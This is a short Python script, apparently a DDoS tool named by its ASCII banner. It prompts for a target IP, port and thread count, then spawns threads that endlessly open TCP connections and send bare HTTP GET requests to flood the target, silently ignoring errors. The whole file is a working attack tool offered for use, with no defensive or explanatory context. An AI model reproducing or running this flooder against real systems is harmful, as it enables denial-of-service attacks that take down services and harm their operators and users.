import socket
import threading
import sys

RED = "\033[31m"
RESET = "\033[0m"

print(RED)
print("  ___   ____   ____  _   _  ____   ____   ____   ____ ")
print(" / _ \ |  _ \ / ___|| | | ||  _ \ |  _ \ / __ \ / ___|")
print("| |_| || |_) | |    | |_| || | | || | | | |  | |\___ \ ")
print("|  _  ||  _ <| |    |  _  || | | || | | | |  | | ___) |")
print("|_| |_||_| \_\\____||_| |_||____/ |____/ \____/ |____/ ")
print(RESET)

targetip = input("Enter target IP: ")
targetport = int(input("Enter target port: "))
threadcount = int(input("Enter thread count: "))

def attack():
 while True:
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((targetip, targetport))
   s.send(b"GET / HTTP/1.1\r\n")
   s.send(b"Host: " + targetip.encode() + b"\r\n\r\n")
   s.close()
  except:
   pass

for i in range(threadcount):
 thread = threading.Thread(target=attack)
 thread.start()
  
